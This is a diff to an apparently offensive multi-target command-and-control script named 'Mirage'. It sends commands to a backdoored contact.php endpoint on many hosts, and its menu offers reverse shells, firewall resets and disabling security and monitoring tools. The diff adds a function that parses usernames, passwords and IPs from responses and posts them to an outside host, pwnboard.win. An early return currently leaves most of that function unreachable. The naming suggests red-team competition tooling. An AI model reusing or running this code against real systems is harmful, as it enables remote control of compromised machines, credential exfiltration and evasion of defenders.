@@ -49,6 +49,7 @@ PORT = 8080
 TIMEOUT = 30
 CONCURRENCY = 8
 THROTTLE_MS = 50
+PWNBOARD_URL = "https://www.pwnboard.win/creds"
 
 console = Console() # For ASCII Art
 
@@ -192,15 +193,53 @@ def select_local_ip():
     
     return selected_ip
 
-def send_command(client, port, command):
-    url = f"http://{client}:{port}/contact.php"
+def fwd_pwnboard(output):
+    print("\nForwarding valid callback to Pwnboard...")
+    print(output)
+    return
+    # Format the string
+    split_msg = output.strip(" ") 
+    split_msg = output.split(":")
+    split_msg[2] = split_msg[2].strip("\n")
+
+    # 2 is IP, 0 is username, 1 is password
+    ip = split_msg[2]
+    user = split_msg[0]
+    pwd = split_msg[1]
+
+     # set up json
+    data = {}
+    data["ip"] = ip
+    data["username"] = user
+    data["password"] = pwd
+    data["service"] = "Mirage"
+    data["message"] = "Valid Callback Found"
+
+    payload = json.dumps(data)
+    # print(payload)
+
+    headers = {'Content-Type': 'application/json'}
+
+    # Send and check result
+    try:
+        result = requests.post(PWNBOARD_URL, headers=headers, data = payload, verify=False)
+        result.raise_for_status()
+    except requests.exceptions.HTTPError as err:
+        print(err)
+    except requests.exceptions.MissingSchema as nourl:
+        print("No Pwnboard_URL provided : Skipping Webhook")
+    else:
+        print("Payload delivered successfully, code {}.".format(result.status_code))
+
+def send_command(client, port, command, callback=False):
+    contact_url = f"http://{client}:{port}/contact.php"
     
     # Send as JSON data
     data = {"input_word": command}
 
     try:
         # Using form data approach
-        r = requests.post(url, json=data, timeout=(3, TIMEOUT))
+        r = requests.post(contact_url, json=data, timeout=(3, TIMEOUT))
         clean_text = r.text.replace('<pre>', '').replace('</pre>', '')
         return (client, r.status_code, clean_text)
 
@@ -246,6 +285,8 @@ def main_interface():
             Choice(value="SHELL", name="Spawn a Reverse Shell"),
             Choice(value="FIREWALL", name="Reset Firewalls"),
             Choice(value="IFEO", name="Disable Security & Monitoring Tools"),
+            Choice(value="UTILIITY", name="Spawn Utility Backdoors (Coming Soon)"),
+            Choice(value="SSH", name="Drop SSH Keys (Coming Soon)"),
             Choice(value="CALLBACK", name="Test Connections"),
             Choice(value=None, name="Exit"),
         ],
@@ -313,7 +354,7 @@ def choose_targets():
     }
     return mapping.get(choice, [])
     
-def run_threads(clients, port, command, action_type="command", attacker_ip=None, attacker_port=None):
+def run_threads(clients, port, command, action_type="command", attacker_ip=None, attacker_port=None, callback=False):
     console.print(f"\n[bold #00ff00]Executing on {len(clients)} targets...[/bold #00ff00]")
     console.print("=" * 60)
     
@@ -333,7 +374,9 @@ def run_threads(clients, port, command, action_type="command", attacker_ip=None,
         with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
             futures = {}
             for client in clients:
-                if action_type == "command":
+                if action_type == "command" and callback == True:
+                    future = ex.submit(send_command, client, port, command, callback)
+                elif action_type == "command":
                     future = ex.submit(send_command, client, port, command)
                 else:  # shell
                     future = ex.submit(spawn_reverse_shell, client, port, attacker_ip, attacker_port)
@@ -359,6 +402,8 @@ def run_threads(clients, port, command, action_type="command", attacker_ip=None,
                         status_color = "#00ff00"  # Green
                         status_icon = "✅"
                         status_text = "SUCCESS"
+                        if callback == True:
+                            fwd_pwnboard(response)
                     elif isinstance(status, int) and 400 <= status < 600:
                         status_color = "#ff0000"  # Red
                         status_icon = "❌"
@@ -718,7 +763,7 @@ def singular_execution():
     console.print(f"\n{double_line}")
     console.print(f"{double_line}")
 
-def mass_execution(command=None):
+def mass_execution(command=None, callback=False):
     targets = choose_targets()
     if not targets:
         print("No targets selected")
@@ -743,7 +788,7 @@ def mass_execution(command=None):
     if not confirm:
         return
     
-    run_threads(targets, PORT, command, "command")
+    run_threads(targets, PORT, command, "command", callback=callback)
 
 def shell_execution(selected_ip):
     # For shell spawning, only allow single target selection
@@ -854,7 +899,7 @@ def main():
             mass_execution(command)
         elif action == "CALLBACK":
             command = "rem"
-            mass_execution(command)
+            mass_execution(command, callback=True)
         else:
             print("Unknown action, returning to menu.")
         
